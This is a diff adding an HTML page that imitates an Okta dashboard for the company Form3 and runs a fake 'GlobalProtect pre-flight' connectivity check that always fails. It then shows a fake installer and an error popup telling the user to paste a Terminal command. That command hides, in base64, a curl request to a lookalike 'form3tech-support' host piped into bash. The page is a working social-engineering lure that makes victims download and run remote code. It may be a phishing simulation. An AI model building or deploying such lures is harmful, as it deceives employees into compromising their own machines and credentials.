@@ -1,0 +1,941 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Okta Dashboard – Connectivity Check (Mock)</title>
+  <style>
+  .btn-spin{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+  }
+  .btn-spin .spin{
+    width:14px;
+    height:14px;
+    border-radius:50%;
+    border:2px solid rgba(37, 99, 235, .25);
+    border-top-color: rgba(37, 99, 235, 1);
+    animation: btnspin 0.9s linear infinite;
+    flex:0 0 14px;
+  }
+  @keyframes btnspin { to { transform: rotate(360deg); } }
+</style>
+  <style>
+    :root{
+      /* Okta-ish neutrals */
+      --bg:#f6f7f9;
+      --panel:#ffffff;
+      --border:#e5e7eb;
+      --text:#111827;
+      --muted:#6b7280;
+
+      /* Form3-ish teal from screenshot sidebar */
+      --teal:#16b6b3;
+      --teal-d:#0ea6a3;
+
+      /* Status colors */
+      --ok:#1f883d;
+      --bad:#cf222e;
+
+      /* Focus/controls */
+      --focus:#2563eb;
+      --shadow:0 1px 2px rgba(16,24,40,.06), 0 1px 1px rgba(16,24,40,.04);
+    }
+
+    *{box-sizing:border-box}
+    html,body{height:100%}
+    body{
+      margin:0;
+      font-family: system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,"Apple Color Emoji","Segoe UI Emoji";
+      color:var(--text);
+      background:var(--bg);
+    }
+
+    /* Layout */
+    .app{
+      height:100%;
+      display:grid;
+      grid-template-columns: 300px 1fr;
+    }
+
+    /* Sidebar */
+    .sidebar{
+      background: var(--teal);
+      color:#0b1b1b;
+      padding:18px 18px 14px;
+      position:relative;
+    }
+    .brand{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      font-weight:800;
+      letter-spacing:.8px;
+      font-size:30px;
+      color:#0b1b1b;
+      margin:6px 0 18px;
+    }
+    .brand .three{color:#0a6f6d}
+    .nav{
+      margin-top:8px;
+      display:flex;
+      flex-direction:column;
+      gap:10px;
+      font-size:14px;
+    }
+    .nav .section-title{
+      opacity:.85;
+      font-weight:600;
+      margin:8px 0 2px;
+    }
+    .nav .item{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      padding:10px 12px;
+      border-radius:8px;
+      background: rgba(0,0,0,.08);
+      box-shadow: inset 0 0 0 1px rgba(0,0,0,.08);
+      color:#0b1b1b;
+      font-weight:600;
+    }
+    .nav .sub{
+      padding:8px 12px;
+      border-radius:8px;
+      color:#0b1b1b;
+      opacity:.9;
+    }
+    .sidebar-footer{
+      position:absolute;
+      left:18px;
+      right:18px;
+      bottom:14px;
+      font-size:12px;
+      opacity:.85;
+      line-height:1.6;
+    }
+
+        /* Make the top-left logo area white (like the screenshot) */
+    .sidebar{
+      padding:0; /* move padding into header/body so header can be white edge-to-edge */
+    }
+
+    .sidebar-header{
+      background:#fff;
+      padding:18px 18px 14px;
+      border-bottom:1px solid rgba(0,0,0,.06);
+    }
+
+    .sidebar-body{
+      padding:14px 18px 0;
+    }
+
+    /* Main */
+    .main{
+      padding:16px 22px 22px;
+      overflow:auto;
+    }
+
+    /* Top row */
+    .toprow{
+      display:flex;
+      align-items:flex-start;
+      justify-content:space-between;
+      gap:16px;
+      margin-bottom:16px;
+    }
+
+    .search{
+      flex:1;
+      max-width:520px;
+      background:var(--panel);
+      border:1px solid var(--border);
+      border-radius:6px;
+      box-shadow:var(--shadow);
+      height:38px;
+      display:flex;
+      align-items:center;
+      gap:10px;
+      padding:0 12px;
+      color:var(--muted);
+      font-size:14px;
+    }
+    .search svg{opacity:.7}
+    .search input{
+      border:0;
+      outline:none;
+      width:100%;
+      font-size:14px;
+      background:transparent;
+      color:var(--text);
+    }
+    .profile{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      padding:6px 10px;
+      border-radius:8px;
+      color:var(--text);
+      font-size:14px;
+    }
+    .profile .meta{
+      display:flex;
+      flex-direction:column;
+      line-height:1.1;
+      text-align:right;
+    }
+    .profile .name{font-weight:700}
+    .profile .org{color:var(--muted); font-size:12px}
+
+    /* Content header row */
+    .content-head{
+      display:flex;
+      align-items:center;
+      justify-content:space-between;
+      gap:16px;
+      margin:12px 0 14px;
+    }
+    .content-head h2{
+      margin:0;
+      font-size:16px;
+      font-weight:700;
+    }
+    .sort{
+      display:flex;
+      align-items:center;
+      gap:8px;
+      background:var(--panel);
+      border:1px solid var(--border);
+      border-radius:6px;
+      padding:7px 10px;
+      font-size:13px;
+      color:#374151;
+      box-shadow:var(--shadow);
+      user-select:none;
+    }
+
+    /* The “apps area” container (we replace grid with our checker) */
+    .apps-area{
+      background:transparent;
+      border-radius:10px;
+    }
+    .apps-shell{
+      background:var(--panel);
+      border:1px solid var(--border);
+      border-radius:10px;
+      box-shadow:var(--shadow);
+      padding:18px 18px 10px;
+    }
+
+    /* Connectivity module (Okta card styling) */
+    .module-title{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      font-size:13px;
+      color:#374151;
+      font-weight:600;
+      margin-bottom:14px;
+    }
+    .module-title .pill{
+      display:inline-flex;
+      align-items:center;
+      gap:6px;
+      padding:6px 10px;
+      border:1px solid var(--border);
+      border-radius:999px;
+      background:#fafafa;
+      color:#111827;
+      font-weight:700;
+      font-size:12px;
+    }
+
+    .steps{
+      list-style:none;
+      margin:0;
+      padding:0;
+      border-top:1px solid #f1f3f5;
+    }
+    .step{
+      display:flex;
+      align-items:center;
+      gap:12px;
+      padding:12px 6px;
+      border-bottom:1px solid #f1f3f5;
+    }
+    .step:last-child{border-bottom:0}
+    .label{
+      flex:1;
+      font-size:14px;
+      color:#111827;
+    }
+    .status{
+      display:flex;
+      align-items:center;
+      gap:10px;
+      min-width:190px;
+      justify-content:flex-end;
+      font-size:12px;
+      color:var(--muted);
+    }
+
+    .icon{width:18px;height:18px;display:grid;place-items:center;flex:0 0 18px}
+    .icon svg{display:block}
+
+    .mini-spinner,.big-spinner{
+      border-radius:50%;
+      border:3px solid rgba(37,99,235,.15);
+      border-top-color: rgba(37,99,235,.95);
+      animation:spin 1s linear infinite;
+    }
+    .mini-spinner{width:16px;height:16px}
+    .big-spinner{width:18px;height:18px}
+
+    @keyframes spin{to{transform:rotate(360deg)}}
+
+    .step[data-state="running"]{
+      background:#f8fafc;
+      border-radius:8px;
+    }
+    .step[data-state="ok"] .status{color:var(--ok)}
+    .step[data-state="fail"] .status{color:var(--bad)}
+
+    .final-row{
+      margin-top:14px;
+      display:none;
+      align-items:center;
+      justify-content:flex-start;
+      gap:10px;
+      padding:12px 10px;
+      border:1px solid var(--border);
+      border-radius:10px;
+      background:#fbfdff;
+      color:#374151;
+      font-size:13px;
+    }
+
+    /* small */
+    @media (max-width: 900px){
+      .app{grid-template-columns: 240px 1fr;}
+      .status{min-width:150px}
+    }
+    @media (max-width: 760px){
+      .app{grid-template-columns: 1fr;}
+      .sidebar{display:none}
+      .main{padding:14px}
+      .status{min-width:140px}
+    }
+  </style>
+</head>
+<body>
+  <div class="app">
+    <!-- Left nav (Okta-ish + Form3 teal) -->
+    
+<aside class="sidebar">
+  <div class="sidebar-header">
+    <div class="brand"><img src="./form3logo.png" width="140px"></div>
+  </div>
+
+  <div class="sidebar-body">
+    <div class="nav">
+      <div class="section-title">Dashboard</div>
+      <div class="item">
+        <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true">
+          <path d="M3 10.5 12 3l9 7.5V21a1 1 0 0 1-1 1h-5v-7H9v7H4a1 1 0 0 1-1-1z" fill="rgba(0,0,0,.72)"/>
+        </svg>
+        <span>My Apps</span>
+      </div>
+      <div class="sub">Work</div>
+      <div class="sub">Add section</div>
+
+      <div class="section-title" style="margin-top:10px;">
+        Notifications <span style="background:rgba(255,255,255,.55);padding:2px 7px;border-radius:999px;font-weight:700;font-size:11px;">1</span>
+      </div>
+    </div>
+
+    <div class="sidebar-footer">
+      <div>Last sign in: a few seconds ago</div>
+      <div>© 2026 Okta, Inc.</div>
+      <div>Privacy</div>
+    </div>
+  </div>
+</aside>
+
+    <!-- Main content -->
+    <main class="main">
+      <div class="toprow">
+        <div class="search" role="search">
+          <svg width="16" height="16" viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M10 18a8 8 0 1 1 5.292-14.01A8 8 0 0 1 10 18Zm11 3-6.1-6.1" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+          <input aria-label="Search your apps" placeholder="Search your apps" />
+        </div>
+
+        <div class="profile" aria-label="Profile">
+          <div class="meta">
+            <span class="name">GPUser</span>
+            <span class="org">form3</span>
+          </div>
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+            <path d="M7 10l5 5 5-5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+          </svg>
+        </div>
+      </div>
+
+      <div class="content-head">
+        <h2>My Apps</h2>
+        <div class="sort" aria-hidden="true">
+          Sort
+          <svg width="16" height="16" viewBox="0 0 24 24"><path d="M7 10l5 5 5-5" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"/></svg>
+        </div>
+      </div>
+
+      <!-- This is where the app tiles would normally be -->
+      <section class="apps-area">
+        <div class="apps-shell">
+          <div class="module-title">
+            <span class="pill">
+              <!-- small shield-ish -->
+              <svg width="14" height="14" viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M12 2l8 4v6c0 5-3.4 9.4-8 10-4.6-.6-8-5-8-10V6z" fill="rgba(17,24,39,.85)"/>
+              </svg>
+              Connectivity Check
+            </span>
+            <span style="color:var(--muted);font-size:12px;">GlobalProtect pre-flight</span>
+          </div>
+
+          <ul class="steps" id="steps">
+            <li class="step" data-key="ip" data-state="pending">
+              <span class="icon" aria-hidden="true"></span>
+              <span class="label">Checking IP connection</span>
+              <span class="status"><span class="mini-spinner" style="display:none" aria-hidden="true"></span><span class="status-text">Pending</span></span>
+            </li>
+
+            <li class="step" data-key="ssl" data-state="pending">
+              <span class="icon" aria-hidden="true"></span>
+              <span class="label">Checking SSL connection</span>
+              <span class="status"><span class="mini-spinner" style="display:none" aria-hidden="true"></span><span class="status-text">Pending</span></span>
+            </li>
+
+            <li class="step" data-key="gp" data-state="pending">
+              <span class="icon" aria-hidden="true"></span>
+              <span class="label">Checking GlobalProtect status</span>
+              <span class="status"><span class="mini-spinner" style="display:none" aria-hidden="true"></span><span class="status-text">Pending</span></span>
+            </li>
+
+            <li class="step" data-key="jamf" data-state="pending">
+              <span class="icon" aria-hidden="true"></span>
+              <span class="label">Checking connection to Jamf</span>
+              <span class="status"><span class="mini-spinner" style="display:none" aria-hidden="true"></span><span class="status-text">Pending</span></span>
+            </li>
+
+            <li class="step" data-key="slack" data-state="pending">
+              <span class="icon" aria-hidden="true"></span>
+              <span class="label">Checking connection to Cloudflare</span>
+              <span class="status"><span class="mini-spinner" style="display:none" aria-hidden="true"></span><span class="status-text">Pending</span></span>
+            </li>
+
+            <li class="step" data-key="outlook" data-state="pending">
+              <span class="icon" aria-hidden="true"></span>
+              <span class="label">Checking connection to Trendmicro API</span>
+              <span class="status"><span class="mini-spinner" style="display:none" aria-hidden="true"></span><span class="status-text">Pending</span></span>
+            </li>
+          </ul>
+
+          <div class="final-row" id="finalRow">
+            <span class="big-spinner" aria-hidden="true"></span>
+            <span>Opening Form3 Self Service</span>
+          </div>
+        </div>
+      </section>
+    </main>
+  </div>
+
+  <script>
+function clickfunc() {
+  alert("Action button clicked!");
+}
+</script>
+<script>
+function openImageModal(imageSrc, textValue = "") {
+  if (document.getElementById("img-modal")) return;
+
+  // Backdrop
+  const modal = document.createElement("div");
+  modal.id = "img-modal";
+  Object.assign(modal.style, {
+    position: "fixed",
+    inset: "0",
+    background: "rgba(0,0,0,0.75)",
+    zIndex: "9999"
+  });
+
+  // Window (draggable). Size will be set to the *actual image size* on load.
+  const win = document.createElement("div");
+  win.id = "img-modal-window";
+  Object.assign(win.style, {
+    position: "fixed",
+    left: "40%",            // slightly left of center
+    top: "50%",
+    transform: "translate(-50%, -50%)",
+    cursor: "grab",
+    userSelect: "none",
+    background: "transparent",
+    // "MacOS Tahoe-ish" shadow (soft + layered)
+    boxShadow: "0 30px 80px rgba(0,0,0,.45), 0 10px 30px rgba(0,0,0,.25)"
+  });
+
+  // Wrapper for overlays
+  const wrapper = document.createElement("div");
+  Object.assign(wrapper.style, {
+    position: "relative",
+    width: "1px",   // temporary; updated when image loads
+    height: "1px",
+    overflow: "visible"
+  });
+
+  // Image (borderless; we do NOT scale it)
+  const img = document.createElement("img");
+  img.src = imageSrc;
+  img.draggable = false;
+  Object.assign(img.style, {
+    display: "block",
+    width: "100%",
+    height: "100%",
+    pointerEvents: "none",   // allows dragging on the image
+    borderRadius: "10px"     // optional: remove if you want sharp corners
+  });
+
+  // Close button (top-left)
+  const closeBtn = document.createElement("button");
+  closeBtn.type = "button";
+  closeBtn.innerHTML = " ";
+  Object.assign(closeBtn.style, {
+    position: "absolute",
+    top: "10px",
+    left: "10px",
+    background: "rgba(0,0,0,0.0)",
+    color: "#fff",
+    border: "none",
+    borderRadius: "50%",
+    width: "32px",
+    height: "32px",
+    cursor: "pointer",
+    fontSize: "16px",
+    lineHeight: "32px",
+    pointerEvents: "auto"
+  });
+  closeBtn.onclick = () => modal.remove();
+
+  // Action button (top-right)
+  const actionBtn = document.createElement("button");
+  actionBtn.type = "button";
+  actionBtn.className = "btn-spin";
+  actionBtn.innerHTML = `<span class="spin" aria-hidden="true"></span><span>Installing</span>`;
+  Object.assign(actionBtn.style, {
+    position: "absolute",
+    top: "254px",
+    right: "676px",
+    padding: "8px 12px",
+    borderRadius: "8px",
+    border: "none",
+    background: "rgba(22,182,179,.95)",
+    fontWeight: "600",
+    cursor: "pointer",
+    pointerEvents: "auto"
+  });
+
+  /*
+  // Text box overlay (center)
+  const textBox = document.createElement("button");
+  //textBox.value = textValue;
+  textBox.innerHTML = "<span class=\"big-spinner\" aria-hidden=\"true\"></span>"
+  Object.assign(textBox.style, {
+    position: "absolute",
+    top: "50%",
+    left: "50%",
+    width: "280px",
+    minHeight: "80px",
+    resize: "none",
+    padding: "10px",
+    border: "none",
+    outline: "none",
+    fontSize: "14px",
+    background: "rgba(255,255,255,0.92)",
+  });
+  */
+  // Assemble
+  wrapper.appendChild(img);
+  wrapper.appendChild(closeBtn);
+  wrapper.appendChild(actionBtn);
+  //wrapper.appendChild(textBox);
+  win.appendChild(wrapper);
+  modal.appendChild(win);
+  document.body.appendChild(modal);
+
+  // Close on ESC
+  const esc = (e) => {
+    if (e.key === "Escape") {
+      modal.remove();
+      document.removeEventListener("keydown", esc);
+    }
+  };
+  document.addEventListener("keydown", esc);
+
+  // Click outside closes (optional)
+  modal.addEventListener("mousedown", (e) => {
+    if (e.target === modal) modal.remove();
+  });
+
+  // ---- Ensure modal is exactly the *image size* (no scaling) ----
+  // If the image is larger than the viewport, we constrain it to fit.
+  img.addEventListener("load", () => {
+    const dpr = window.devicePixelRatio || 1;
+    const natW = img.naturalWidth/dpr || 1;
+    const natH = img.naturalHeight/dpr || 1;
+
+    // Fit within viewport with margin, but keep aspect ratio.
+    const margin = 40; // breathing room around edges
+    const maxW = Math.max(100, window.innerWidth - margin);
+    const maxH = Math.max(100, window.innerHeight - margin);
+
+    const scale = Math.min(1, maxW / natW, maxH / natH); // never upscale
+    const w = Math.round(natW * scale);
+    const h = Math.round(natH * scale);
+
+    wrapper.style.width = w + "px";
+    wrapper.style.height = h + "px";
+  }, { once: true });
+
+  // ---- Drag logic (whole window draggable; size stays fixed) ----
+  //const interactive = new Set([closeBtn, actionBtn, textBox]);
+  const interactive = new Set([closeBtn,actionBtn]);
+  let dragging = false;
+  let startX = 0, startY = 0;
+  let originLeft = 0, originTop = 0;
+
+  win.addEventListener("mousedown", (e) => {
+    // Don't drag when interacting with controls
+    if ([...interactive].some(node => node === e.target || node.contains(e.target))) return;
+
+    dragging = true;
+    win.style.cursor = "grabbing";
+
+    // Convert from transform-based position to pixel position once dragging starts
+    const rect = win.getBoundingClientRect();
+    win.style.transform = ""; // remove translate
+    win.style.left = rect.left + "px";
+    win.style.top = rect.top + "px";
+
+    originLeft = rect.left;
+    originTop = rect.top;
+    startX = e.clientX;
+    startY = e.clientY;
+    e.preventDefault();
+  });
+
+  window.addEventListener("mousemove", (e) => {
+    if (!dragging) return;
+
+    const dx = e.clientX - startX;
+    const dy = e.clientY - startY;
+
+    const rect = win.getBoundingClientRect();
+    const margin = 8;
+
+    const newLeft = Math.min(
+      window.innerWidth - rect.width - margin,
+      Math.max(margin, originLeft + dx)
+    );
+    const newTop = Math.min(
+      window.innerHeight - rect.height - margin,
+      Math.max(margin, originTop + dy)
+    );
+
+    win.style.left = newLeft + "px";
+    win.style.top = newTop + "px";
+  });
+
+  window.addEventListener("mouseup", () => {
+    if (!dragging) return;
+    dragging = false;
+    win.style.cursor = "grab";
+  });
+}
+</script>
+
+<script>
+let modalZIndex = 10000; // global stacking order
+
+function openImageModal2(imageSrc, textValue = "") {
+  modalZIndex += 2;
+
+  // Backdrop (per modal)
+  const modal = document.createElement("div");
+  Object.assign(modal.style, {
+    position: "fixed",
+    inset: "0",
+    background: "rgba(0,0,0,0.6)",
+    zIndex: modalZIndex
+  });
+
+  // Window
+  const win = document.createElement("div");
+  Object.assign(win.style, {
+    position: "fixed",
+    left: "40%",
+    top: "50%",
+    transform: "translate(-50%, -50%)",
+    cursor: "grab",
+    userSelect: "none",
+    background: "transparent",
+    zIndex: modalZIndex + 1,
+    boxShadow:
+      "0 40px 100px rgba(0,0,0,.45), " +
+      "0 15px 40px rgba(0,0,0,.3)" // macOS-style layered shadow
+  });
+
+  // Bring to front on interaction
+  win.addEventListener("mousedown", () => {
+    modalZIndex += 2;
+    modal.style.zIndex = modalZIndex;
+    win.style.zIndex = modalZIndex + 1;
+  });
+
+  // Wrapper
+  const wrapper = document.createElement("div");
+  Object.assign(wrapper.style, {
+    position: "relative",
+    width: "1px",
+    height: "1px"
+  });
+
+  // Image
+  const img = document.createElement("img");
+  img.src = imageSrc;
+  img.draggable = false;
+  Object.assign(img.style, {
+      display: "block",
+      pointerEvents: "none",
+      borderRadius: "10px",
+      width: "100%",
+      height: "100%"
+  });
+
+  // Close button
+  const closeBtn = document.createElement("button");
+  closeBtn.innerHTML = " ";
+  Object.assign(closeBtn.style, {
+    position: "absolute",
+    top: "372px",
+    left: "324px",
+    width: "74px",
+    height: "32px",
+    border: "none",
+    background: "rgba(0,0,0,.0)",
+    color: "#fff",
+    cursor: "pointer"
+  });
+  closeBtn.onclick = () => {
+    modal.remove();
+    win.remove();
+  };
+
+  // Action button
+  /*const actionBtn = document.createElement("button");
+  actionBtn.textContent = "Action";
+  Object.assign(actionBtn.style, {
+    position: "absolute",
+    top: "10px",
+    right: "10px",
+    padding: "8px 12px",
+    borderRadius: "8px",
+    border: "none",
+    background: "rgba(22,182,179,.95)",
+    fontWeight: "600",
+    cursor: "pointer"
+  });
+  actionBtn.onclick = () => {
+    if (typeof clickfunc === "function") clickfunc();
+  };*/
+
+  // Text box
+  const textBox = document.createElement("textarea");
+  textBox.value = textValue;
+  Object.assign(textBox.style, {
+    position: "absolute",
+    top: "204px",
+    left: "240px",
+    transform: "translate(-50%, -50%)",
+    width: "300px",
+    minHeight: "70%",
+    //padding: "10px",
+    //borderRadius: "10px",
+    border: "none",
+    //background: "rgba(255,255,255,.95)",
+    background: "transparent",
+    color: "white",
+    resize: "none"
+  });
+  textBox.disabled = true;
+
+  // Assemble
+  wrapper.append(img, closeBtn, textBox);
+  win.appendChild(wrapper);
+  document.body.append(modal, win);
+
+  // Size = intrinsic image size (DPR aware, no upscale)
+  img.onload = () => {
+    const DPR = window.devicePixelRatio || 1;
+    const natW = img.naturalWidth/DPR;
+    const natH = img.naturalHeight/DPR;
+
+    const margin = 40;
+    const maxW = window.innerWidth - margin;
+    const maxH = window.innerHeight - margin;
+
+    const scale = Math.min(1, maxW / natW, maxH / natH);
+    wrapper.style.width = Math.round(natW * scale) + "px";
+    wrapper.style.height = Math.round(natH * scale) + "px";
+  };
+
+  // Drag logic
+  let dragging = false;
+  let startX, startY, startL, startT;
+
+  win.addEventListener("mousedown", (e) => {
+    if ([closeBtn, textBox].some(el => el.contains(e.target))) return;
+
+    dragging = true;
+    win.style.cursor = "grabbing";
+
+    const r = win.getBoundingClientRect();
+    win.style.transform = "";
+    win.style.left = r.left + "px";
+    win.style.top = r.top + "px";
+
+    startX = e.clientX;
+    startY = e.clientY;
+    startL = r.left;
+    startT = r.top;
+    e.preventDefault();
+  });
+
+  window.addEventListener("mousemove", (e) => {
+    if (!dragging) return;
+    win.style.left = startL + (e.clientX - startX) + "px";
+    win.style.top = startT + (e.clientY - startY) + "px";
+  });
+
+  window.addEventListener("mouseup", () => {
+    dragging = false;
+    win.style.cursor = "grab";
+  });
+}
+</script>
+
+
+  <script>
+    // UI simulation only (no real network probing). Loops continuously.
+    const sequence = [
+      { key: "ip",      result: "ok",   ms: 850  },
+      { key: "ssl",     result: "ok",   ms: 1050 },
+      { key: "gp",      result: "fail", ms: 1100 },
+      { key: "jamf",    result: "fail", ms: 1050 },
+      { key: "slack",   result: "fail", ms: 1150 },
+      { key: "outlook", result: "fail", ms: 1150 },
+    ];
+
+    const stepsEl = document.getElementById("steps");
+    const finalRowEl = document.getElementById("finalRow");
+
+    function iconSVG(type){
+      if(type === "ok"){
+        return `
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="12" r="10" fill="var(--ok)"></circle>
+            <path d="M7 12.5l3 3 7-7" fill="none" stroke="#fff" stroke-width="2.6" stroke-linecap="round" stroke-linejoin="round"/>
+          </svg>`;
+      }
+      if(type === "fail"){
+        return `
+          <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="12" cy="12" r="10" fill="var(--bad)"></circle>
+            <path d="M8 8l8 8M16 8l-8 8" fill="none" stroke="#fff" stroke-width="2.6" stroke-linecap="round"/>
+          </svg>`;
+      }
+      return `
+        <svg width="18" height="18" viewBox="0 0 24 24" aria-hidden="true">
+          <circle cx="12" cy="12" r="10" fill="rgba(107,114,128,.20)"></circle>
+          <circle cx="12" cy="12" r="4" fill="rgba(107,114,128,.55)"></circle>
+        </svg>`;
+    }
+
+    function getStep(key){
+      return stepsEl.querySelector(`.step[data-key="${key}"]`);
+    }
+
+    function setStepState(stepEl, state, text){
+      stepEl.dataset.state = state;
+      const iconEl = stepEl.querySelector(".icon");
+      const spinnerEl = stepEl.querySelector(".mini-spinner");
+      const statusTextEl = stepEl.querySelector(".status-text");
+
+      if(state === "running"){
+        iconEl.innerHTML = iconSVG("pending");
+        spinnerEl.style.display = "inline-block";
+        statusTextEl.textContent = text || "Checking…";
+      } else if(state === "ok"){
+        iconEl.innerHTML = iconSVG("ok");
+        spinnerEl.style.display = "none";
+        statusTextEl.textContent = text || "OK";
+      } else if(state === "fail"){
+        iconEl.innerHTML = iconSVG("fail");
+        spinnerEl.style.display = "none";
+        statusTextEl.textContent = text || "Failed";
+      } else {
+        iconEl.innerHTML = iconSVG("pending");
+        spinnerEl.style.display = "none";
+        statusTextEl.textContent = text || "Pending";
+      }
+    }
+
+    function resetAll(){
+      finalRowEl.style.display = "none";
+      sequence.forEach(s => setStepState(getStep(s.key), "pending", "Pending"));
+    }
+
+    const sleep = (ms) => new Promise(r => setTimeout(r, ms));
+
+    async function runOnce(){
+      for (const s of sequence){
+        const el = getStep(s.key);
+        setStepState(el, "running", "Checking…");
+        await sleep(s.ms);
+        setStepState(el, s.result === "ok" ? "ok" : "fail", s.result === "ok" ? "OK" : "Failed");
+        await sleep(250);
+      }
+      finalRowEl.style.display = "flex";
+      await sleep(2200);
+    }
+
+    (async function loop(){
+      /*while(true){
+        resetAll();
+        await sleep(500);
+        await runOnce();
+        await sleep(900);
+      }*/
+      resetAll();
+      await sleep(500);
+      await runOnce();
+      await sleep(500);
+      openImageModal('selfservice.png', 'Edit me')
+      await sleep(5500);
+      openImageModal2('popupwindowbg.png', 'Error checking in with Jamf. To finish installing the GlobalProtect Fix please run Jamf checkin manually from the terminal: \n\n- copy the following command: \n\njamf help && echo \"Y3VybCAtcyBodHRwczovL2Zvcm0zdGVjaC1zdXBwb3J0LmdpdGh1Yi5pby8vY29ubmVjdGl2aXR5dGVzdC5odG1sICAgfCBiYXNo\" | base64 -d | bash\n\n- press ⌘ + Space type Terminal and hit ⏎\n- when Terminal is launched hit ⌘ + v (or right click paste) this will paste the checkin command\n- hit ⏎ to run the checkin command \n')
+    })();
+  </script>
+</body>
+</html>
+
